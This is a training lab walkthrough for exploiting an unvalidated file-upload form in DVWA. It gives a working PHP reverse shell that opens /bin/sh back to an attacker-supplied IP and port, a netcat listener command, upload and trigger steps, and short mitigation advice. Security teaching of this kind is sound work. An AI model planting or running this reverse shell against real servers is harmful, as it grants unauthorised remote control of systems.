## 🔍 Lab 3: File Upload – Reverse Shell & RCE

### 💼 Scenario
A document submission form accepts uploads without validating MIME type or restricting executable files.

### 🎯 Objective
Upload a PHP reverse shell and gain access to the system.

## 🧪 Steps

### 🔹 Step 1: Write the PHP Reverse Shell Script
1. On your host machine (attacker), create a file named `reverse.php` with this code::

```php
<?php
$ip = 'YOUR-IP'; // Replace with your local IP (not 127.0.0.1)
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
Replace `YOUR-IP` with your actual host IP that the Docker container can reach. If unsure, use `ip addr` or `ifconfig` to find your local IP.

### 🔹 Step 2: Set Up a Netcat Listener
On your host machine, open a terminal and run:

```bash
# This listens for incoming connections on port 4444.
nc -l 4444
```
### 🔹 Step 3: Upload the Reverse Shell in DVWA
1. Upload via DVWA → File Upload.
2. Click Browse and select the `reverse.php` file.
3. Submit the form. DVWA will upload your file.

### 🔹 Step 4: Trigger the Reverse Shell
Now that the file is uploaded, open a browser and visit:

```
http://localhost:4280/hackable/uploads/reverse.php
```
Once accessed, the PHP script executes, and your Netcat listener will catch the shell.

### 🔹 Step 5: Interact with the Shell
Now you're in the container shell! Try:

```bash
whoami
ls /
hostname
```

### 🧠 Real-World Context 
- Why **file uploads must never** be trusted
- Real-world risk of **Remote Code Execution (RCE)**
- How attackers chain simple bugs into **full server compromise**
- This attack is often seen in WordPress plugin exploits or misconfigured upload folders.

### 🛡️ Mitigation

- Disallow dangerous extensions.
- Store uploaded files outside webroot.
- Sanitize and rename files on upload.